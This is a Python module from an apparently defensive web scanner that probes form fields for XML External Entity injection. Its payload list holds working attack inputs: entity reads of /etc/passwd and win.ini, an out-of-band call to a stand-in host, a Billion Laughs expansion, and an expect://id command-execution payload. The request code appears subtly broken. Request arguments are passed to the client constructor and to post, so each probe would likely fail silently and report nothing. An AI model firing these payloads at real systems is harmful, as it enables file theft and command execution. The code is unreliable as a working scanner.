"""
XXE (XML External Entity) Scanner
Detects XML External Entity injection by submitting crafted XML payloads
that attempt to read local files via SYSTEM entities, trigger out-of-band
DNS lookups, or cause Billion-Laughs-style entity expansion.
"""
import re
from typing import TYPE_CHECKING

import httpx

from .base import BaseScanner, Finding

if TYPE_CHECKING:
    from wscan.engine import ScanEngine

_XXE_PAYLOADS: list[tuple[str, str]] = [
    # (payload, description)
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        "SYSTEM entity file read (/etc/passwd)",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
        "SYSTEM entity file read (win.ini)",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://wscan-oob.example.invalid/xxe">%xxe;]><root/>',
        "OOB parameter entity DNS probe",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><root>&lol3;</root>',
        "Billion Laughs entity expansion DoS probe",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>',
        "PHP expect:// wrapper for OS command execution",
    ),
]

# Patterns that indicate a successful /etc/passwd read
_PASSWD_RE = re.compile(r"root:.*:0:0:", re.DOTALL)
_WIN_INI_RE = re.compile(r"\[(?:fonts|extensions|mci extensions|files)\]", re.IGNORECASE)
_EXPANSION_RE = re.compile(r"lollol|entity.*expanded|billion.*laugh", re.IGNORECASE)


def _looks_like_xml_endpoint(field: dict) -> bool:
    """Heuristic: field name or type hints at XML input."""
    name = (field.get("name") or field.get("id") or "").lower()
    ftype = (field.get("type") or "text").lower()
    xml_hints = ("xml", "soap", "wsdl", "body", "data", "payload", "content", "request")
    return any(h in name for h in xml_hints) or ftype in ("hidden", "textarea")


class XXEScanner(BaseScanner):
    """XML External Entity injection scanner."""

    CHECK_TYPE = "xxe"
    SEVERITY = "high"

    def __init__(self, engine: "ScanEngine"):
        super().__init__(engine)
        self._checked_urls: set[str] = set()

    async def scan_field(
        self,
        url: str,
        form_index: int,
        field: dict,
        is_url_param: bool = False,
    ) -> list[Finding]:
        if not _looks_like_xml_endpoint(field):
            return []

        field_name = field.get("name") or field.get("id") or f"field_{form_index}"
        findings: list[Finding] = []

        proxy = getattr(self.engine, "proxy", "") or None
        timeout = getattr(self.engine, "timeout", 15)

        for payload, description in _XXE_PAYLOADS:
            if self.monitor:
                await self.monitor.emit_payload_test(url, field_name, payload, self.CHECK_TYPE)
            try:
                kwargs: dict = {
                    "content": payload,
                    "headers": {"Content-Type": "application/xml"},
                    "timeout": timeout,
                    "follow_redirects": True,
                    "verify": False,
                }
                if proxy:
                    kwargs["proxy"] = proxy

                async with httpx.AsyncClient(**kwargs) as client:
                    r = await client.post(url, **{k: v for k, v in kwargs.items()
                                                  if k not in ("proxy",)})
                body = r.text

            except Exception as exc:
                if self.monitor:
                    await self.monitor.emit_status(
                        f"[warn] xxe: request failed on {url} ({field_name}): {exc}"
                    )
                continue

            evidence = None
            if _PASSWD_RE.search(body):
                evidence = f"XXE: /etc/passwd content reflected in response — {description}"
            elif _WIN_INI_RE.search(body):
                evidence = f"XXE: win.ini content reflected in response — {description}"
            elif _EXPANSION_RE.search(body):
                evidence = f"XXE: entity expansion output in response — {description}"
            elif r.elapsed.total_seconds() > timeout * 0.8 and "oob" in description:
                evidence = f"XXE: response delay suggests OOB DNS lookup triggered — {description}"

            if evidence:
                finding = await self.record_finding(
                    url=url,
                    field_name=field_name,
                    payload=payload,
                    evidence=evidence,
                    pair={
                        "request": {"url": url, "method": "POST", "body": payload},
                        "response": {"status": r.status_code, "body": body[:2000]},
                    },
                    severity="high",
                )
                findings.append(finding)
                break  # one confirmed finding per field is enough

        return findings

    async def scan_page(self, url: str) -> list[Finding]:
        return []
